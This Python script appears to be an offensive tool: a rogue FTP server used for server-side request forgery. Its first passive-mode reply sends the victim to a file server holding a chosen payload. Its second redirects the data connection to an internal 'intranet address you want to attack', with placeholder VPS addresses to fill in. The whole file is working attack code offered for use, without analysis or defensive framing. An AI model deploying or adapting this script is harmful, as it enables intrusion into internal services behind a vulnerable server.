import threading
import socket
# python3 only

# ssrf data
ssrf_data = """
test
"""
data_size = len(ssrf_data)

ftp_ip = "vps-ip:vps-port"  # Address of ftp server
sendfile_ip = "vps-ip:vps-port"  # Address of the file server
ssrf_ip = "vps-ip:vps-port"  # The intranet address you want to attack

def ip2server(ip):
    host, port = str(ip).split(":")
    return ('0.0.0.0', int(port))

def ip2pasv(ip):
    host, port = str(ip).split(":")
    return tuple([int(i) for i in host.split(".")]) + (int(port) // 256, int(port) % 256)

ftp_key_table = {
    "SIZE" : [
        b"213 %d\r\n" % (data_size),
        b"550 /test is not retrievable.\r\n"
    ],

    "PASV" : [
        b"227 Entering passive mode (%d,%d,%d,%d,%d,%d).\r\n" % (ip2pasv(sendfile_ip)),
        b"227 Entering passive mode (%d,%d,%d,%d,%d,%d).\r\n" % (ip2pasv(ssrf_ip))
    ]
}

ftp_table = {
    "USER" : b"331 Username ok, send password.\r\n",
    "PASS" : b"230 Login successful.\r\n",
    "TYPE" : b"200 Type set to: Binary.\r\n",
    "EPSV" : b"500 'EPSV': command not understood.\r\n",
    "RETR" : b"150 File status okay. About to open data connection.\r\n",
    "STOR" : b"150 File status okay. About to open data connection.\r\n",
    "QUIT" : b"221 Goodbye.\r\n"
}

RETR_COMPLETE = b"226 Transfer complete.\r\n"

def ftp_server():
    s = socket.socket()
    s.bind(ip2server(ftp_ip))
    print("已开启:", ip2server(ftp_ip))
    s.listen(1)
    count = 0

    while True:
        print("="*30)
        c, addr = s.accept()
        print('已链接:', addr)

        c.send(b'220 pyftpdlib 1.5.6 ready.\r\n')
        while True:
            data = str(c.recv(1024).decode("utf-8")).replace("\n", "")
            print(addr, " -> self:", data)
            comm = data[:4]
            if comm == "SIZE" or comm == "PASV":
                c.send(ftp_key_table.get(comm)[count])
                print("self ->", addr, ":", ftp_key_table.get(comm)[count].decode("utf-8").replace("\n", ""))
            else:
                c.send(ftp_table.get(comm))
                print("self ->", addr, ":", ftp_table.get(comm).decode("utf-8").replace("\n", ""))

            if comm == "RETR":
                c.send(RETR_COMPLETE)
                print("self ->", addr, ":", RETR_COMPLETE.decode("utf-8").replace("\n", ""))
            elif comm == "QUIT":
                c.close()
                break
        
        count += 1
        if count == 2:
            break
    
    s.close()

def send_file_server():
    s = socket.socket()
    s.bind(ip2server(sendfile_ip))
    s.listen()

    c, addr = s.accept()
    c.send(ssrf_data.encode("utf-8"))
    c.close()
    s.close()

t1 = threading.Thread(target=ftp_server)
t2 = threading.Thread(target=send_file_server)

t1.start()
t2.start()

t1.join()
t2.join()
